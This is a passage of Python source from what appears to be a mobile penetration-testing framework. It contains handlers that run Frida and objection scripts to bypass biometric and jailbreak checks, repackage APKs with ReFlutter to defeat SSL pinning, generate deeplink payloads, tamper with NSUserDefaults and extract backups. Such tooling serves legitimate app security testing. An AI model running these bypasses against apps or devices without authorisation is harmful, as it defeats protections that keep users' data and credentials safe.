                {"name": "MAL_URL", "value": self._other_tools.snake_data["mal_url"], "description": "If type set to launch_deeplink, set the URL as: http://localhost:8080/, specifically, where you host your payload", "required": False},
                {"name": "APP_NAME", "value": self._other_tools.snake_data["app_name"], "description": "The target application", "required": False},
                {"name": "COMPONENT", "value": self._other_tools.snake_data["component"], "description": "The target component like com.example.android.MainActivity", "required": False}
            ])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    def generate_deeplink(self, cmd, data):
        self._other_tools._generate_deeplink_data_d = data
        if cmd == "run": 
            if self._other_tools._generate_deeplink_data_d["scheme"] and self._other_tools._generate_deeplink_data_d["package"] and self._other_tools._generate_deeplink_data_d["component"] and self._other_tools._generate_deeplink_data_d["deeplink_uri"]:
                threading.Thread(target=self._other_tools.generate_deeplink, args=([])).start()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "SCHEME", "value": self._other_tools._generate_deeplink_data_d["scheme"], "description": "The deeplink's scheme."},
                {"name": "PACKAGE", "value": self._other_tools._generate_deeplink_data_d["package"], "description": "The application package name: com.example.android"},
                {"name": "COMPONENT", "value": self._other_tools._generate_deeplink_data_d["component"], "description": "The vulnerable activity. e.g. com.example.android/.WebViewActivity"},
                {"name": "DEEPLINK_URI", "value": self._other_tools._generate_deeplink_data_d["deeplink_uri"], "description": "The deeplink URI."},
                {"name": "PATH", "value": self._other_tools._generate_deeplink_data_d["path"], "description": "The path where to store the files. Default to: ~/.mmsf/loot/", "required": False},
                {"name": "EXTRAS", "value": self._other_tools._generate_deeplink_data_d["extras"], "description": "The extra values in form of TYPE KEY VALUE. e.g. S com.example.REDIRECT_URL https://interactsh.io. To remove an extra value, just type remove KEY", "required": False}
            ])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

        # Analyze Keystore
    def keystore_analyze(self, cmd, data):
        pass

    # Bypass Fingerprint detection using frida android
    def bypass_android_biometrics_frida(self, cmd, data):
        self._frida.config = data
        if cmd == "run":
            if self._frida.config["mode"] == '-R':
                if not self._frida.config["host"]:
                    print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                    return 0    
            if self._frida.config["app"]:
                threading.Thread(target=self._frida.bypass_android_biometrics, args=([])).start()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "MODE", "value": "SERIAL" if self._frida.config["mode"] == "-U" else "REMOTE", "description": "The Type of Connection with frida-server: Serial or Remote. Default set to Serial", "required": False},
                {"name": "APP", "value": self._frida.config["app"], "description": "The application package name: com.example.android"},
                {"name": "HOST", "value": self._frida.config["host"], "description": "If MODE set to Remote, specify HOST. Default set to 127.0.0.1", "required": False},
                {"name": "PAUSE", "value": "TRUE" if self._frida.config["pause"] == "--pause" else "FALSE" , "description": "The application should be paused on start? Default set to FALSE", "required": False},
                {"name": "METHOD", "value": "SPAWN" if self._frida.config["method"] == '-f' else "FRONTMOST", "description": "The method of attaching to the application: frontmost or spawn. Default SPAWN"}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2
    
    # Bypass Fingerprint detection using frida ios
    def bypass_ios_biometrics_frida(self, cmd, data):
        self._frida.config = data
        if cmd == "run":
            if self._frida.config["mode"] == '-R':
                if not self._frida.config["host"]:
                    print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                    return 0    
            if self._frida.config["app"]:
                threading.Thread(target=self._frida.bypass_ios_biometrics, args=([])).start()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "MODE", "value": "SERIAL" if self._frida.config["mode"] == "-U" else "REMOTE", "description": "The Type of Connection with frida-server: Serial or Remote. Default set to Serial", "required": False},
                {"name": "APP", "value": self._frida.config["app"], "description": "The application package name: com.example.android"},
                {"name": "HOST", "value": self._frida.config["host"], "description": "If MODE set to Remote, specify HOST. Default set to 127.0.0.1", "required": False},
                {"name": "PAUSE", "value": "TRUE" if self._frida.config["pause"] == "--pause" else "FALSE" , "description": "The application should be paused on start? Default set to FALSE", "required": False},
                {"name": "METHOD", "value": "SPAWN" if self._frida.config["method"] == '-f' else "FRONTMOST", "description": "The method of attaching to the application: frontmost or spawn. Default SPAWN"}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2
    
    
    # Bypass Fingerprint detection using objection ios
    def bypass_ios_biometrics_objection(self, cmd, data):
        self._objection._config["app"] = data["app"]
        if cmd == "run": 
            if self._objection._config["app"]:
                threading.Thread(target=self._objection.bypass_ios_biometrics, args=([])).start()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "APP", "value": self._objection._config["app"], "description": "The application package name: com.example.android"}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    # Patch IPA
    def patch_ipa(self):
        pass

    # Use reflutter to patch ssl pinning apk
    def reflutter_sslpinning(self, cmd, data):
        """
        ReFlutter SSL pinning bypass workflow using existing MMSF infrastructure
        """
        
        # Set configuration from data
        self._reflutter.set_config("app", data.get("app"))
        self._reflutter.set_config("apk_path", data.get("apk_path"))
        self._reflutter.set_config("burp_host", data.get("burp_host", "127.0.0.1"))
        
        if cmd == "run":
            if not self._reflutter.config["app"] and not self._reflutter.config["apk_path"]:
                print(Fore.RED + "[-] APP name or apk_path is required!" + Fore.RESET)
                return 0
                
            print(Fore.CYAN + "\n" + "="*70 + Fore.RESET)
            print(Fore.GREEN + "    ReFlutter SSL Pinning Bypass Workflow" + Fore.RESET)
            print(Fore.CYAN + "="*70 + "\n" + Fore.RESET)
            
            # Step 1: Check if app is Flutter-based
            print(Fore.YELLOW + "[*] Checking if app is Flutter-based..." + Fore.RESET)
            
            if self._reflutter.get_config("apk_path"):
                # Set pulled_apk_dirs to the directory containing the APK
                output_path = pulled_apks_dir = os.path.dirname(self._reflutter.get_config("apk_path"))
                # Set base_apk_path to the APK path itself
                base_apk_path = self._reflutter.get_config("apk_path")
            else:
            # Pull APK using existing MMSF methods
                package = self._reflutter.config["app"]
                output_path = os.path.join(Constants.DIR_PULLED_APKS.value)
                os.makedirs(output_path, exist_ok=True)
                
                # Use existing APK pull method
                self._apktool._config_split["path"]= output_path
                self._apktool._config_split["app"] = package
                self.pull_apks()  # This will pull to output_path

                pulled_apks_dir = os.path.join(output_path, package)  # Assuming pull_apks saves as package.apk
                base_apk_path = os.path.join(pulled_apks_dir, f"base.apk")

                if not base_apk_path or not os.path.exists(base_apk_path):
                    print(Fore.RED + "[-] Could not pull APK" + Fore.RESET)
                    return 0
                
            # Check if it's actually a Flutter app
            if not self._reflutter.is_flutter_app(base_apk_path):
                print(Fore.RED + "[-] This is not a Flutter application" + Fore.RESET)
                return 0

            self._reflutter.config["apk_path"] = base_apk_path
            self._reflutter.config["output_path"] = output_path
            
            try:                    
                # Check if it's a split APK by looking for split files
                split_apk_files = [f for f in os.listdir(pulled_apks_dir) if f.startswith('split_config')]
                is_split_apk = len(split_apk_files) > 0
                
                if is_split_apk:
                    print(Fore.YELLOW + "[*] Detected split APK structure" + Fore.RESET)
                    
                    # Find the correct split APK based on architecture and OS
                    # Look for split_config.arm64_v8a.apk first
                    split_file_version = None
                    for split_file in split_apk_files:
                        if 'arm64_v8a' in split_file:
                            split_file_version = split_file
                            break
                        elif 'armeabi_v7a' in split_file:
                            split_file_version = split_file  # Fallback to armeabi_v7a if arm64_v8a not found
                            break
                        elif 'x86_64' in split_file:
                            split_file_version = split_file  # Fallback to x86_64 if no ARM splits found
                            break
                        elif 'x86' in split_file:
                            split_file_version = split_file  # Fallback to x86 if no better option found
                            break
                        elif 'armeabi' in split_file:
                            split_file_version = split_file  # Fallback to armeabi if no better option found
                            break
                    
                    # If still no split found, use the first split config file
                    if not split_file_version and split_apk_files:
                        split_file_version = split_apk_files[0]
                    
                    if split_file_version:
                        print(Fore.YELLOW + f"[*] Using split APK: {split_file_version}" + Fore.RESET)
                        self._reflutter.config["apk_path"] = os.path.join(pulled_apks_dir, split_file_version)
                        
                        print(Fore.YELLOW + "[*] Patching APK with ReFlutter..." + Fore.RESET)
                        patched_apk = self._reflutter.patch_apk()
                        
                        if not patched_apk:
                            print(Fore.RED + "[-] APK patching failed" + Fore.RESET)
                            return 0
                        
                        splits = []
                        for split_file in split_apk_files:
                            if split_file != split_file_version:
                                splits.append(os.path.join(pulled_apks_dir, split_file))

                        self._apktool._config_split["apks"] = ",".join(splits)
                        self._apktool._config_split["path"] = pulled_apks_dir

                        # Create temp directory
                        temp_dir = os.path.join(pulled_apks_dir, "temp_reflutter")
                        os.makedirs(temp_dir, exist_ok=True)

                        print(Fore.YELLOW + f"[*] Moving files to temp directory: {temp_dir}" + Fore.RESET)

                        # Move release.RE.apk to temp directory
                        temp_patched_apk = os.path.join(temp_dir, "release.RE.apk")
                        shutil.move(patched_apk, temp_patched_apk)
                        print(Fore.GREEN + f"[+] Moved {patched_apk} → {temp_patched_apk}" + Fore.RESET)

                        # Move original split_file_version to temp directory as backup
                        original_split_path = os.path.join(pulled_apks_dir, split_file_version)
                        temp_original_split = os.path.join(temp_dir, f"{split_file_version}.original")
                        shutil.move(original_split_path, temp_original_split)
                        print(Fore.GREEN + f"[+] Moved {original_split_path} → {temp_original_split}" + Fore.RESET)

                        # Rename release.RE.apk to split_file_version name
                        renamed_patched_apk = os.path.join(temp_dir, split_file_version)
                        shutil.move(temp_patched_apk, renamed_patched_apk)
                        print(Fore.GREEN + f"[+] Renamed release.RE.apk → {split_file_version}" + Fore.RESET)

                        self._apktool.decompile_apks()
                        self._apktool._config_split["path"] = os.path.join(pulled_apks_dir, "decompiled")
                        self._apktool.generate_apks()
                        self._apktool._config_split["path"] = os.path.join(os.path.join(pulled_apks_dir, "decompiled"), "modified")

                        # Move renamed patched APK to final destination
                        final_destination = os.path.join(self._apktool._config_split["path"], split_file_version)
                        shutil.move(renamed_patched_apk, final_destination)
                        print(Fore.GREEN + f"[+] Moved to final destination: {final_destination}" + Fore.RESET)

                        # Cleanup temp directory (optional - keep backup if needed)
                        shutil.rmtree(temp_dir)
                        self._apktool._config_split["apks"] = None  # Clear split APK config since we moved the patched APK to the final location

                        # Step 4: Sign the patched APK
                        print(Fore.YELLOW + "[*] Signing patched APK..." + Fore.RESET)
                        self._apktool.sign_apks()

                        self._apktool._config_split["path"] = os.path.join(os.path.join(os.path.join(pulled_apks_dir, "decompiled"), "modified"), "signed")
                            
                        # Step 5: Install the signed APK
                        print(Fore.YELLOW + "[*] Installing signed APK..." + Fore.RESET)

                        print(Fore.YELLOW + "\n[*] Application installation options:" + Fore.RESET)
                        choice = input("Do you want to uninstall and reinstall the app? (y/n): ").strip().lower()
                        
                        if choice in ['y', 'yes']:
                            print(Fore.YELLOW + "[*] Uninstalling existing app..." + Fore.RESET)
                            # Uninstall the app
                            self._apktool.config["app"] = self._reflutter.config["app"]  # Ensure app is set for uninstall
                            self._apktool.uninstall_apk()
                            self._apktool.install_apks()
                        else:
                            print(Fore.YELLOW + "[*] Install the app manually: adb install-multiple -r base.apk split1.apk split2.apk " +  + Fore.RESET)

                            
                        print(Fore.GREEN + "[+] ReFlutter SSL pinning bypass completed successfully!" + Fore.RESET)
                        print(Fore.GREEN + f"[+] Installed: {self._reflutter.config['app']}" + Fore.RESET)
                        return 1

                else:
                    print(Fore.YELLOW + "[*] Patching APK with ReFlutter..." + Fore.RESET)
                    patched_apk = self._reflutter.patch_apk()
                    
                    if not patched_apk:
                        print(Fore.RED + "[-] APK patching failed" + Fore.RESET)
                        return 0

                    # Step 4: Sign the patched APK
                    print(Fore.YELLOW + "[*] Signing patched APK..." + Fore.RESET)
                    patched_apk_path = os.path.join(pulled_apks_dir, patched_apk)
                    self._apktool.sign_apk(patched_apk_path)

                    try:
                        # Use aapt to extract package name from APK
                        aapt_cmd = f"{Constants.AAPT.value} dump badging \"{base_apk_path}\" | grep package"
                        result = subprocess.run(aapt_cmd, shell=True, capture_output=True, text=True)
                        if result.returncode == 0:
                            # Extract package name from output like: package: name='com.example.app' versionCode='1' versionName='1.0'
                            output = result.stdout.strip()
                            package_match = re.search(r"name='([^']+)'", output)
                            if package_match:
                                self._reflutter.config["app"] = package_match.group(1)
                        else:
                            print(Fore.YELLOW + "[*] Could not read APK manifest" + Fore.RESET)
                    except Exception as e:
                        print(Fore.YELLOW + f"[*] Error reading APK manifest: {e}" + Fore.RESET)

                    print(Fore.YELLOW + "\n[*] Application installation options:" + Fore.RESET)
                    choice = input("Do you want to uninstall and reinstall the app? (y/n): ").strip().lower()
                    
                    if choice in ['y', 'yes']:
                        print(Fore.YELLOW + "[*] Uninstalling existing app..." + Fore.RESET)
                        # Uninstall the app
                        self._apktool.config["app"] = self._reflutter.config["app"]  # Ensure app is set for uninstall
                        self._apktool.uninstall_apk()
                        # Step 5: Install the signed APK
                        print(Fore.YELLOW + "[*] Installing signed APK..." + Fore.RESET)
                        cmd_install = f"{Constants.ADB.value} install -r {self._apktool._patched_apk}"
                        result = subprocess.run(cmd_install.split(), capture_output=True, text=True)
                        if result.returncode != 0:
                            print(Fore.RED + f"[-] Installation failed: {result.stderr}" + Fore.RESET)
                            return 0
                    else:
                        print(Fore.YELLOW + "[*] Install the app manually: adb install -r base.apk " +  + Fore.RESET)

                    print(Fore.GREEN + "[+] ReFlutter SSL pinning bypass completed successfully!" + Fore.RESET)
                    print(Fore.GREEN + f"[+] Installed: {self._reflutter.config['app']}" + Fore.RESET)
                    return 1

            except Exception as e:
                    print(Fore.RED + f"[-] Error processing APK: {e}" + Fore.RESET)
                    return 0
            
        elif cmd == "show":
            print_show_table([
            {"name": "APP", "value": self._apktool._config_split["app"], "description": "The application name: MyApplication. Omit if APK_PATH is set", "required": False},
            {"name": "APK_PATH", "value": self._apktool._config_split.get("apk_path"), "description": "Direct path to APK file. If set, APP is not required", "required": False},
            {"name": "BURP_HOST", "value": self._apktool._config_split.get("burp_host", "127.0.0.1"), "description": "Burp proxy host for SSL pinning bypass", "required": False},])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            return 2

    def bypass_flutter_ssl_frida(self, cmd, data):
        self._frida.config = data
        if cmd == "run":
            if self._frida.config["app"]:
                threading.Thread(target=self._frida.bypass_flutter_ssl, args=([])).start()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0
        elif cmd == "show":
            print_show_table([
                {"name": "MODE",   "value": "SERIAL" if self._frida.config["mode"] == "-U" else "REMOTE",
                "description": "Serial or Remote. Default: Serial", "required": False},
                {"name": "APP",    "value": self._frida.config["app"],
                "description": "Package name: com.example.flutter"},
                {"name": "HOST",   "value": self._frida.config["host"],
                "description": "Host if MODE=Remote. Default: 127.0.0.1", "required": False},
                {"name": "PAUSE",  "value": "TRUE" if self._frida.config["pause"] == "--pause" else "FALSE",
                "description": "Pause app on start. Default: FALSE", "required": False},
                {"name": "METHOD", "value": "SPAWN" if self._frida.config["method"] == "-f" else "FRONTMOST",
                "description": "Attach method. Default: SPAWN", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    # Antifrida bypass
    def antifrida_bypass(self, cmd, data):
        pass    

    # Listen for clipboard data
    def clipboard_manager(self, cmd, data):
        pass

    # Install burp CA as root
    def install_burp_root_ca(self, cmd, data):
        pass
    
    def bypass_jailbreak_objection_ios(self, cmd, data):
        self._objection._config["app"] = data["app"]
        if cmd == "run": 
            if self._objection._config["app"]:
                threading.Thread(target=self._objection.bypass_ios_jailbreak, args=([])).start()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "APP", "value": self._objection._config["app"], "description": "The application package name: com.example.ios"}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2
        
    def bypass_ios_jailbreak_frida(self, cmd, data):
        self._frida.config = data
        if cmd == "run":
            if self._frida.config["mode"] == '-R':
                if not self._frida.config["host"]:
                    print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                    return 0    
            if self._frida.config["app"]:
                threading.Thread(target=self._frida.bypass_ios_jailbreak, args=([])).start()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "MODE", "value": "SERIAL" if self._frida.config["mode"] == "-U" else "REMOTE", "description": "The Type of Connection with frida-server: Serial or Remote. Default set to Serial", "required": False},
                {"name": "APP", "value": self._frida.config["app"], "description": "The application package name: com.example.android"},
                {"name": "HOST", "value": self._frida.config["host"], "description": "If MODE set to Remote, specify HOST. Default set to 127.0.0.1", "required": False},
                {"name": "PAUSE", "value": "TRUE" if self._frida.config["pause"] == "--pause" else "FALSE" , "description": "The application should be paused on start? Default set to FALSE", "required": False},
                {"name": "METHOD", "value": "SPAWN" if self._frida.config["method"] == '-f' else "FRONTMOST", "description": "The method of attaching to the application: frontmost or spawn. Default SPAWN"}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2
    
    def run_nuclei_scan(self, cmd, data):
        self._nuclei.config = data
        paths = ['Keys', 'Android']
        decompiled = False
        if cmd == "run":   
            if self._nuclei.config["dir_name"]:
                outdir = Constants.DIR_NUCLEI_SCANS.value if not self._nuclei.config.get("out_dir") else os.path.join(self._nuclei.config.get("out_dir"), 'nuclei_scans')

                if not os.path.isdir(outdir):
                    os.mkdir(outdir)
                for path in paths:
                    print(Fore.YELLOW + f"[*] Executing nuclei in background for {path} templates." + Fore.RESET)
                    threading.Thread(target=self._nuclei._start_scan, args=([path])).start()
                return 1
            elif self._nuclei.config["app_name"] and self._nuclei.config["app_name"] in self.all_apps:
                app_name = self._nuclei.config["app_name"]
                apk_dir = Constants.DIR_PULLED_APKS.value
                apk_path = os.path.join(apk_dir, f"{app_name}.apk")

                def previous_decompilation():
                    return os.path.isdir(os.path.join(apk_dir, app_name))

                previous_decom = previous_decompilation()
                decompiled = previous_decom
                data_scan = {
                        "dir_name": app_name,
                        "app": app_name,
                        "path": apk_dir,
                        "mode": "d",
                        "apk": f"{app_name}.apk",
                        "out_apk": Constants.PATCHED_APK.value,
                        "in_apk": Constants.GENERATED_APK.value,
                    }
                if not os.path.isdir(self._apktool.get_apk_dir()):
                    print(Fore.YELLOW + f"[*] Pulling APK for {app_name}..." + Fore.RESET)
                    self.getapk("run", data_scan)
                    print(Fore.YELLOW + "[*] Waiting for APK extraction to finish..." + Fore.RESET)
                    apk_path = os.path.join(data_scan["path"], data_scan["apk"])
                    wait_count = 0
                    while not os.path.isfile(apk_path):
                        time.sleep(1)
                        wait_count += 1
                        if wait_count > 30:
                            print(Fore.RED + f"[-] Timeout: APK {apk_path} does not exist after extraction." + Fore.RESET)
                            return 0

                    print(Fore.GREEN + '[*] Decompiling apk...' + Fore.RESET)
                    try:
                        self._apktool._config_split["apks"] = data_scan["apk"]
                        self._apktool.decompile_apks(data_scan["apk"])
                    except Exception as e:
                        print(Fore.RED + f"[-] Decompilation failed: {e}" + Fore.RESET)
                        return 0
                    wait_count = 0
                    while not os.path.isdir(self._apktool.get_apk_dir()):
                        time.sleep(1)
                        wait_count += 1
                        if wait_count > 30:
                            print(Fore.RED + f"[-] Timeout: APK {apk_path} does not exist after extraction." + Fore.RESET)
                            return 0

                for path in paths:
                    self._nuclei.config["dir_name"] = self._apktool.get_apk_dir()
                    print(Fore.YELLOW + f"[*] Executing nuclei in background for {path} templates." + Fore.RESET)
                    threading.Thread(target=self._nuclei._start_scan, args=([path])).start()
                return 1
            elif self._nuclei.config["app_name"] not in self.all_apps:
                print(Fore.RED + "[-] The application was not found on the device. Try again!" + Fore.RESET)
                return 0
             
        elif cmd == "show":
            print_show_table([
                {"name": "APP_NAME", "value": self._nuclei.config["app_name"], "description": "The application name in form of com.example.android. Omit it if you set the DIR_NAME", "required": False},
                {"name": "OUT_DIR", "value": self._nuclei.config["out_dir"], "description": "The directory where scans are saved. Default to ~/.mmsf/loot/data/nuclei_scans", "required": False},
                {"name": "DIR_NAME", "value": self._nuclei.config["dir_name"], "description": "The directory to be scanned. Omit it if you set the APP_NAME", "required": False},
                {"name": "OUT_FILE", "value": self._nuclei.config["out_file"], "description": "The output of the nuclei. Default to app_name_nuclei_output", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2
        
    def nsuserdefaults_modify(self, cmd, data):
        self._frida.config = data
        if cmd == "run":
            if self._frida.config["mode"] == '-R':
                if not self._frida.config["host"]:
                    print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                    return 0    
            if self._frida.config["app"]:
                threading.Thread(target=self._frida.nsuserdefaults_modify, args=([])).start()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "MODE", "value": "SERIAL" if self._frida.config["mode"] == "-U" else "REMOTE", "description": "The Type of Connection with frida-server: Serial or Remote. Default set to Serial", "required": False},
                {"name": "APP", "value": self._frida.config["app"], "description": "The application package name: com.example.android"},
                {"name": "HOST", "value": self._frida.config["host"], "description": "If MODE set to Remote, specify HOST. Default set to 127.0.0.1", "required": False},
                {"name": "PAUSE", "value": "TRUE" if self._frida.config["pause"] == "--pause" else "FALSE" , "description": "The application should be paused on start? Default set to FALSE", "required": False},
                {"name": "METHOD", "value": "SPAWN" if self._frida.config["method"] == '-f' else "FRONTMOST", "description": "The method of attaching to the application: frontmost or spawn. Default SPAWN"},
                {"name": "KEY", "value": self._frida.config["key"], "description": "The NSUserDefaults Key to be modified"},
                {"name": "VALUE", "value": self._frida.config["value"], "description": "The newly value to be added to NSUserDefaults key"}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2
        
    def nsuserdefaults_retrieve(self, cmd, data):
        self._frida.config = data
        if cmd == "run":
            if self._frida.config["mode"] == '-R':
                if not self._frida.config["host"]:
                    print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                    return 0    
            if self._frida.config["app"]:
                threading.Thread(target=self._frida.nsuserdefaults_retrieve, args=([])).start()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "MODE", "value": "SERIAL" if self._frida.config["mode"] == "-U" else "REMOTE", "description": "The Type of Connection with frida-server: Serial or Remote. Default set to Serial", "required": False},
                {"name": "APP", "value": self._frida.config["app"], "description": "The application package name: com.example.android"},
                {"name": "HOST", "value": self._frida.config["host"], "description": "If MODE set to Remote, specify HOST. Default set to 127.0.0.1", "required": False},
                {"name": "PAUSE", "value": "TRUE" if self._frida.config["pause"] == "--pause" else "FALSE" , "description": "The application should be paused on start? Default set to FALSE", "required": False},
                {"name": "METHOD", "value": "SPAWN" if self._frida.config["method"] == '-f' else "FRONTMOST", "description": "The method of attaching to the application: frontmost or spawn. Default SPAWN"}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    def list_readable_files(self, directory_path):
        """Lists readable files within a specified directory.

        Args:
            directory_path (str): The path to the directory.

        Returns:
            list: A list of absolute paths of readable files.
        """

        command = f"adb shell ls -la {directory_path}"
        output = subprocess.check_output(command.split()).decode("utf-8").splitlines()

        readable_files = []
        for line in output:
            if line.strip():
                file_info = line.split()
                permissions = file_info[0]
                file_name = file_info[-1]
                if len(permissions) != 10:
                    continue
                if permissions[7] == 'r' and (file_name != '.' and file_name != '..'):  # Check if the file is readable
                    full_path = f"{directory_path}/{file_name}"
                    readable_files.append(full_path)

        return readable_files

    def pull_apks(self):
        cmd_to_run = [Constants.ADB.value, 'shell', 'pm', 'path', self._apktool._config_split["app"]]
        output = subprocess.run(cmd_to_run, stderr=DEVNULL, stdout=PIPE).stdout.decode().splitlines()
        pattern = re.compile(r"package:(.*?\.apk)")
        print(Fore.GREEN + '[+] Pulling apks...' + Fore.RESET)

        for line in output:
            file_path = Path(pattern.findall(line)[0]).parent
            pull_files = self.list_readable_files(file_path)
            dst = os.path.join(self._apktool._config_split["path"],self._apktool._config_split["app"])
            os.makedirs(dst, exist_ok=True)
            for file in pull_files:
                pull_cmd = [Constants.ADB.value, 'pull', file, dst]
                p = subprocess.run(pull_cmd, stdout=PIPE, stderr=PIPE)
            print(Fore.GREEN + f'[+] Data pulled successfully to {dst}' + Fore.RESET)
            return
        print(Fore.RED + '[-] The application does not exist. Try again' + Fore.RESET)

    def getapks(self, cmd, data):
        self._apktool._config_split = data
        if cmd == "run": 
            if self._apktool._config_split["app"]:
                threading.Thread(target=self.pull_apks, args=([])).start()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "APP", "value": self._apktool._config_split["app"], "description": "The application name: MyApplication"},
                {"name": "PATH", "value": self._apktool._config_split["path"], "description": "The path where to save the apks. Default to: ~/.mmsf/loot/apks", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    def install_apks(self, cmd, data):
        self._apktool._config_split = data
        if cmd == "run": 
            if self._apktool._config_split["path"] or self._apktool._config_split["apks"]:
                print(Fore.GREEN + "[+] Installing apks.." + Fore.RESET)
                self._apktool.install_apks()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "APKS", "value": self._apktool._config_split["apks"], "description": "The APKs that are going to be installed. Example: base.apk, split_config.en.apk", 'required': False},
                {"name": "PATH", "value": self._apktool._config_split["path"], "description": "The path where the APKs are located. Default to: ~/.mmsf/loot/apks", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2
        
    def generate_apks(self, cmd, data):
        self._apktool._config_split = data
        if cmd == "run": 
            if self._apktool._config_split["path"]:
                print(Fore.GREEN + "[+] Generating apks.." + Fore.RESET)
                self._apktool.generate_apks()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "APKS", "value": self._apktool._config_split["apks"], "description": "The APKs that are going to be installed. Default: base_patched.apk", 'required': True},
                {"name": "PATH", "value": self._apktool._config_split["path"], "description": "The path where the apk is located. Default to: ~/.mmsf/loot/apks", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2

    def sign_apks(self, cmd, data):
        self._apktool._config_split = data
        if cmd == "run": 
            if self._apktool._config_split["path"] or self._apktool._config_split["apks"]:
                print(Fore.GREEN + "[+] Signing apks.." + Fore.RESET)
                self._apktool.sign_apks()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "APKS", "value": self._apktool._config_split["apks"], "description": "The APKs that are going to be signed. Example: base.apk, split_config.en.apk", 'required': False},
                {"name": "PATH", "value": self._apktool._config_split["path"], "description": "The path where the APKs are located. Default to: ~/.mmsf/loot/apks", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2
    
    def decompile_apks(self, cmd, data):
        self._apktool._config_split = data
        if cmd == "run": 
            if self._apktool._config_split["path"] or self._apktool._config_split["apks"]:
                print(Fore.GREEN + "[+] Decompiling apks.." + Fore.RESET)
                self._apktool.decompile_apks()
                return 1
            else:
                print(Fore.RED + "[-] Set the required values first!" + Fore.RESET)
                return 0              
        elif cmd == "show":
            print_show_table([
                {"name": "APKS", "value": self._apktool._config_split["apks"], "description": "The APKs that are going to be decompiled. Example: base.apk, split_config.en.apk", 'required': False},
                {"name": "PATH", "value": self._apktool._config_split["path"], "description": "The path where the APKs are located. Default to: ~/.mmsf/loot/apks", "required": False}])
            return 0
        elif cmd == "exit":
            quit_app()
        elif cmd == "back":
            back()
            return 2
        
    def ngbackup_extract(self, cmd, data, method="legacy"):
        """Unified ng-backup extraction handler"""
        if data["app"]:
            self._other_tools.config["app"] = data["app"]
        if data["path"]:
            self._other_tools.config["path"] = data["path"]
        if data.get("password"):
            self._other_tools.config["password"] = data["password"]
        
        if cmd == "run":
            if not self._other_tools.config["app"]:
                print(Fore.RED + "[-] Set APP first!" + Fore.RESET)
                return 0
            
            # Handle patch method using split APK workflow
            if method == "patch":
                package = self._other_tools.config["app"]
                output_path = os.path.join(Constants.DIR_PULLED_APKS.value, package)
                os.makedirs(output_path, exist_ok=True)
                
                print(Fore.YELLOW + "[*] Extracting via APK patching..." + Fore.RESET)
                
                try:
                    # Pull APKs using split APK workflow
                    self._apktool.config["app"] = package
                    self._apktool.config["path"] = output_path
                    self.pull_apk()  # This pulls to output_path
                    
                    # Set up split APK config
                    self._apktool._config_split["path"] = output_path
                    self._apktool._config_split["app"] = package
                    
                    # Get the pulled APK name
                    apk_name = self._apktool.config["apk"]
                    
                    # ** Direct patch using split APK infrastructure **
                    print(Fore.YELLOW + "[*] Patching APK (direct method)..." + Fore.RESET)
                    signed_apk = self._apktool.patch_manifest_direct(package, output_path)
                    
                    if not signed_apk:
                        raise Exception("Direct patching failed")
                    
                    # Install patched APK
                    cmd_install = f"{Constants.ADB.value} install -r -d {signed_apk}"
                    print(Fore.YELLOW + "[*] Installing patched APK..." + Fore.RESET)
                    result = subprocess.run(cmd_install.split(), capture_output=True, text=True)
                    
                    if result.returncode != 0:
